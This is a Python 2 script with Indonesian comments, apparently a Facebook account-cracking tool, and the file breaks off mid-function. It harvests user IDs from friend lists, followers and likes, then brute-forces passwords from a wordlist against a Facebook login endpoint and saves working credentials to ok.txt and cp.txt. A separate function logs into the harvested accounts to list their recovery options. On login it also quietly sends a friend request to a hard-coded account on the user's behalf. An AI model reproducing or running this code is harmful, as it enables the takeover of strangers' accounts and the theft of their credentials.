#coding=utf-8

#Open Source Code Syarat? Subrek Channel Gua & Jangan Ganti Bot Follow! Cukup Tambahkan Bot Follow Sajah!

# Ingat Ini Hanya Untuk Contoh Project!. Kalo Mau Recode, Recode Ajah Itung² Buat Latihan Lu

# Kalo Mau Izin, Izin lewat instgrm/email/fb Ajah

# insgrm : https://www.instagram.com/ngemry7
# email  : xgansb@gmail.com
# fb     : https://www.facebook.com/meyrina.setyaningrum

import requests,bs4,sys,os,subprocess,getpass,hashlib
import random,time,re,json
import emailerendem,calendar,nande
from datetime import datetime
from datetime import date 
from concurrent.futures import ThreadPoolExecutor
from mechanize import Browser
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from requests.exceptions import ConnectionError
from mechanize import Browser
if 'linux' in sys.platform.lower():
    N = '\x1b[1;94m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import mechanize
    except ImportError:
        os.system('pip2 install mechanize')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)

p = "\033[1;37m"
o = "\033[1;36m"
m = "\033[1;91m"
h = "\033[1;32m"

ua = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

loop = 0
id = []
ide = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

namamu = []
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

reload(sys)
sys.setdefaultencoding("utf-8")
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent',ua)]

banner = """\033[1;37m
   ______\033[1;91m   __ __ \033[1;37m            __  
  / ____/ \033[1;91m / // /  \033[1;37m  _____   / /__
 / /      \033[1;91m/ // /_ \033[1;37m  / ___/  / //_/
/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32morbXD.\033[1;37m
\____/   \033[1;91m  /_/   \033[1;37m  \___/  /_/|_|\n
  \033[1;33m•\033[1;91m•\033[1;37m New Tools Hack Facebook Random \033[1;33m•\033[1;91m•\033[1;37m
 \033[1;33m•\033[1;91m•\033[1;37m Gunakan Akun Tumbal Untuk Login! \033[1;33m•\033[1;91m•\033[1;37m"""

logo = """\033[1;37m
   ______\033[1;91m   __ __ \033[1;37m            __  
  / ____/ \033[1;91m / // /  \033[1;37m  _____   / /__
 / /      \033[1;91m/ // /_ \033[1;37m  / ___/  / //_/
/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32morbXD.\033[1;37m
\____/   \033[1;91m  /_/   \033[1;37m  \___/  /_/|_|\n"""


host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":ua}).json()["country_name"].lower()
except:
	ips=None
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")

### Menu Login ###


def login():
    os.system('clear')
    print banner
    print("\033[0;96m"+50*"-")
    print ' \x1b[0;97m[\x1b[0;96m1\x1b[0;97m] Login With Email & Pass (\033[1;36mRawan CheckPoint\033[1;37m)'
    print ' \x1b[0;97m[\x1b[0;96m2\x1b[0;97m] Login With Token Facebook  (\033[1;36mRecommended\033[1;37m)'
    print ' \x1b[0;97m[\x1b[0;96m3\x1b[0;97m] Login With Cookie Facebook (\033[1;36mRecommended\033[1;37m)'
    print ' \x1b[0;97m[\x1b[0;96m4\x1b[0;97m] Check Video Cara Ambil Token/Cookie fb '
    print ' \x1b[0;97m[\x1b[0;96m0\x1b[0;97m] Exite Programs'
    sek = raw_input('\n \x1b[0;97m[\x1b[0;96m•\x1b[0;97m] Choose : ')
    if sek=="":
        print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah").format(R,N);login()
    elif sek=="1":
        rawancp()
    elif sek=="2":
        log_token()
    elif sek=="3":
        cookie()
    elif sek=="4":
        alltutor()
    elif sek=="0":
        exit()
    else:
        print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah").format(R,N);login()

### Login Email&Pass ###


def rawancp():
	try:
		toket = open('___dekura___sayang___ara___','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print("\033[0;96m"+50*"-")
		id = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Email/No: ')
		pwd = getpass.getpass("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass Akun: ")
		jalan("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Sedang Login...")
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No connection"
			os.sys.exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("___dekura___sayang___ara___", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Berhasil Login'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				exit(nande.________________nande________________anatawa________________recode________________script________________watashi________________())
			except requests.exceptions.ConnectionError:
				print"\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No connection"
				os.sys.exit()
		if 'checkpoint' in url:
			print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Akun Anda Terkena Checkpoint")
			os.system('rm -rf ___dekura___sayang___ara___')
			os.sys.exit()
		else:
			print("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Login Gagal")
			os.system('rm -rf ___dekura___sayang___ara___')
			time.sleep(2)
			login()

### Login Token ###


def log_token():
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	data = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token: ")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		open("___dekura___sayang___ara___",'w').write(data)
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Login Success").format(G,N)
		jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Please Subscribe My Channel:)")
		os.system('xdg-open https://youtube.com/channel/UCMlyT-T7FLXopriA9HDbXEQ')
		exit(nande.________________nande________________anatawa________________recode________________script________________watashi________________())
	except KeyError:
		print ("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Invalid Token").format(R,N)
		time.sleep(1.0)
		raw_input("\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Lihat Cara Ambil Token Y/y? ")
		kontolrecode()
		login()

### Login cookie ###


def cookie():
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	cookie = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie: ")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
		#print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie Invalid")
		#time.sleep(1.5)
		#tutorcowlies()
	except requests.exceptions.ConnectionError:
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No Connection")
	cookie = open("___dekura___sayang___ara___", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	jalan("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Please Subscribe My Channel:)")
	os.system('xdg-open https://youtube.com/channel/UCMlyT-T7FLXopriA9HDbXEQ')
	exit(nande.________________nande________________anatawa________________recode________________script________________watashi________________())

def convert():
	global post,reac,kom
	try:
		token = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36', #B4ngsat
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : open(".cok",'r').read()
		})
		find_token = re.search('(EAAA\w+)', token.text)
		if (find_token is None):
			pass
		else:
			open("___dekura___sayang___ara___",'w').write(find_token.group(1))
			return
	except Exception as e:
		print(R+"\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Error : %s"%e)
		exit()


### AMBIL TOKEN ###


def kontolrecode():
    os.system("clear")
    print logo
    print("\033[0;96m"+50*"-")
    jalan(p+" ["+o+"•"+p+"] Open Youtube...")
    os.system("xdg-open https://youtu.be/qhxw5BVUBlE")
    raw_input(p+" [BACK]")
    login()   

### Ambil Cookies ###


def tutorcowlies():
    os.system("clear")
    print logo
    print("\033[0;96m"+50*"-")
    jalan(p+" ["+o+"•"+p+"] Open Youtube...")
    os.system("xdg-open https://youtu.be/NxkjhemO-r0")
    raw_input(p+" [BACK]")
    login()   

### Tutor Ambil Cookie/Token ###

def alltutor():
    os.system('clear')
    print banner
    print("\033[0;96m"+50*"-")
    print ' \x1b[0;97m[\x1b[0;96m1\x1b[0;97m] Check Tutor Cara Ambil Token Facebook  '
    print ' \x1b[0;97m[\x1b[0;96m2\x1b[0;97m] Check Tutor Cara Ambil Cookie Facebook  '
    print ' \x1b[0;97m[\x1b[0;96m3\x1b[0;97m] Back To Menu Login'

    print ' \x1b[0;97m[\x1b[0;96m0\x1b[0;97m] Exite Programs'
    sek = raw_input('\n \x1b[0;97m[\x1b[0;96m•\x1b[0;97m] Choose : ')
    if sek=="":
        print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah").format(R,N);login()
    elif sek=="1":
        kontolrecode()
    elif sek=="2":
        tutorcowlies()
    elif sek=="3":
        login()
    elif sek=="0":
        exit()
    else:
        print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah").format(R,N);alltutor()

### Menu Tools ###


def menu():
  try:
    toket = open('___dekura___sayang___ara___','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['first_name']
    id = a['id']
  except Exception as e:
    print ("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error : %s"%e).format(R,N)
    time.sleep(1)
    login()
  os.system("clear")
  print logo
  print("\033[0;96m"+50*"-")
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Your Name    : \033[1;32m"+nama)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Your ID      : \033[1;32m"+id)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Tgl Login Sc : \033[1;32m"+tanggal)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Version      : \033[1;32m*Test Version")
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Expired      : \033[1;32m16 - 09 - 2021")
  print("\033[0;96m"+50*"-")
  print("\033[0;96m\033[0;97m [\033[1;36m1\033[1;37m] Crack ID From Friendlist/Public")
  print("\033[0;96m\033[0;97m [\033[1;36m2\033[1;37m] Crack ID From Followers")
  print("\033[0;96m\033[0;97m [\033[1;36m3\033[1;37m] Crack ID From Likes")
  print("\033[0;96m\033[0;97m [\033[1;36m4\033[1;37m] Crack From ID Target (\033[1;36mTergantung Hoki Kalian\033[1;37m)")
  print("\033[0;96m\033[0;97m [\033[1;36m5\033[1;37m] Crack With Email ")
  print("\033[0;96m\033[0;97m [\033[1;36m6\033[1;37m] Crack With Number Phone")
  print("\033[0;96m\033[0;97m [\033[1;36m7\033[1;37m] Cek Result Crack")
  print("\033[0;96m\033[0;97m [\033[1;36m8\033[1;37m] Cek Opsi Sesi Account Cp ")
  print("\033[0;96m\033[0;97m [\033[1;36m0\033[1;37m] Logout")
  print ""
  r=raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ")
  if r=="":print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] isi Yang Benar").format(R,N);menu()
  elif r=="1":
      publik()
      dekura_x()
  elif r=="2":
      followers()
      dekura_x()
  elif r=="3":
      likes()
      dekura_x()
  elif r=="4":
      hek_target()
  elif r=="5":
      exit(emailerendem.emaileclone())# Sengaja Gua Pisah Biar Gak Ngesetuck
  elif r=="6":
      exit(arawangy.tetearakecil())# Sengaja Gua Pisah Biar Gak Ngesetuck
  elif r=="7":
      ress()
  elif r=="8":
      syngara()
#  elif r=="90":
#      infotarget()
#      dekura_x()
  elif r=="0":
    try:
      #os.remove(".cok")
      os.remove("___dekura___sayang___ara___")
      #exit(basecookie())
    except Exception as e:print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Eror file tidak ditemukan %s"%e)
  else:
    print ("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] SALAH ANJING!").format(R,N);menu()

### Check Option Sesi ###


def syngara():
	print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Masukan File cp.txt")
	files = raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] File: ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Files %s%s%s Tidak Ada!"%(h,files,p))
	print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Total Account Cp : \033[1;32m%s\033[1;37m"%(len(buka_baju)))
	print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Check Opsi Checkpoint, Please Wait...")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Account : "+(kontol.replace(" + ","")))
		try:
			aracans(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Cek Account Checkpoint Selesai...")
	raw_input("%s [BACK]"%(p))
	menu()

def aracans(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	# kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Total Opsi Yang Tersedia  "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[1;36m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] %s"%(oh))
	else:
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Login Gagal, ID/Pass Salah\n")

### BruteForce Target (Kalo Hoki) ###


def hek_target():
	global toket
	try:
		toket=open('___dekura___sayang___ara___','r').read()
	except IOError:
		print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie Invalid"
		os.system('rm -rf ___dekura___sayang___ara___')
		login()
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	try:
		email = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID TARGET: ")
		passw = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Wordlist: ")
		total = open(passw,"r")
		total = total.readlines()
		time.sleep(1)
		print("\033[0;96m"+50*"-")
		time.sleep(1)
		print "\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID TARGET : "+email
		time.sleep(1)
		print "\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total Password : "+str(len(total))
		time.sleep(1)
		jalan('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack Started...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Check Pass Valid : "+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("ok.txt", "w")
					dapat.write(email+"|"+pw+"\n")
					dapat.close()
					time.sleep(1.5)
					print "\n [\033[1;36m\xe2\x80\xa2\x1b[1;37m] ACCOUNT SUCCES [\033[1;36m\xe2\x80\xa2\x1b[1;37m]"
					time.sleep(2)
					print("\033[0;96m"+50*"-")
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID : "+email)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass Valid : "+pw)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] HASIL CRACK TERSIMPAN DI : ok.txt")
					raw_input(" [BACK]")
					menu()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("cp.txt", "w")
					ceks.write(email+"|"+pw+"\n")
					ceks.close()
					time.sleep(1.5)
					print "\n [\033[1;36m\xe2\x80\xa2\x1b[1;37m] ACCOUNT CHECKPOINT [\033[1;36m\xe2\x80\xa2\x1b[1;37m]"
					time.sleep(2)
					print("\033[0;96m"+50*"-")
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID : "+email)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass Valid : "+pw)
					print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] HASIL CRACK TERSIMPAN DI : cp.txt")
					raw_input(" [BACK]")
					menu()
			except requests.exceptions.ConnectionError:
				print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Connection Error"
				time.sleep(1)
	except IOError:
		print ("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] File Wordlist Tidak Di Temukan")
		time.sleep(2)
		menu()

################ LAGI DI UPDATE! #############$##


def wordlist(): #~~~MASIH DI UPDATE
	try:
		toket=open('___dekura___sayang___ara___','r').read()
	except IOError:
		print"\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie Invalid"
		os.system('rm -rf ___dekura___sayang___ara___')
		login()
	os.system('clear')
	print logo
	print("\033[0;96m"+50*"-")
	try:
		idt = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID TARGET: ")
		r = requests.get('https://graph.facebook.com/'+idt+'/?access_token='+toket)
		z = json.loads(r.text)
		nama = z['first_name']
		hasil = open("pass.txt", "w")
		hasil.write(nama+"123\n"+nama+"123456"+""" 
		""")
		hasil.close()
	except Exception as e:
		exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error: %s' % e)

### ID Friendslist/Public ###


def publik():
    try:
        toket = open('___dekura___sayang___ara___', 'r').read()
    except IOError:
        os.system('rm -rf ___dekura___sayang___ara___')
        time.sleep(0.01)
        os.sys.exit()
    print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Friendlist"
    idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
    try:
        r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
        z = json.loads(r.text)
        for a in z['data']:
            idne = a['id']
            jenenge = a["name"]
            id.append(idne+'<=>'+jenenge)
    except KeyError:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pertemanan Tidak Ada!')
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: %s' % len(id)

### ID Dari Followers ###


def followers():
    try:
        toket = open('___dekura___sayang___ara___', 'r').read()
    except IOError:
        os.system('rm -rf ___dekura___sayang___ara___')
        time.sleep(0.01)
        os.sys.exit()
    print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Friendlist"
    idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
    try:
        r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
        z = json.loads(r.text)
        for a in z['data']:
            idne = a['id']
            jenenge = a["name"]
            id.append(idne+'<=>'+jenenge)
    except KeyError:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User Followers Tidak Ada!')
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: %s' % len(id)

### Krek ID Massal ##


def dekura___sayang___ara():
    try:
        toket = open('___dekura___sayang___ara___', 'r').read()
    except IOError:
        os.system('rm -rf ___dekura___sayang___ara___')
        time.sleep(0.01)
        os.sys.exit()
    print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Friendlist"
    idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
    iduo = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')

    try:
        r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
        z = json.loads(r.text)
        k = requests.get('https://graph.facebook.com/'+iduo+'/friends?access_token='+toket)
        j = json.loads(k.text)
        for a in z['data']:
            idne = a['id']
            jenenge = a["name"]
            for x in j['data']:
                iduoo = x['id']
                jenengeee = x["name"]
                kntl = (idne + iduoo)
                jmbd = (jenengeee + jenenge)
            id.append(kntl+'<=>'+jmbd)
    except KeyError:
        print "kntl"
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: %s' % len(id)

### ID Dari Likes ###


def likes():
    try:
        toket = open('___dekura___sayang___ara___', 'r').read()
    except IOError:
        os.system('rm -rf ___dekura___sayang___ara___')
        time.sleep(0.01)
        os.sys.exit()
    print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Friendlist"
    idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
    try:
        r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
        z = json.loads(r.text)
        for a in z['data']:
            idne = a['id']
            jenenge = a["name"]
            id.append(idne+'<=>'+jenenge)
    except KeyError:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User Like Tidak Ada!')
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: %s' % len(id)

### Check Info Target ###


def infotarget():
    try:
        toket = open('___dekura___sayang___ara___','r').read()
    except IQError:
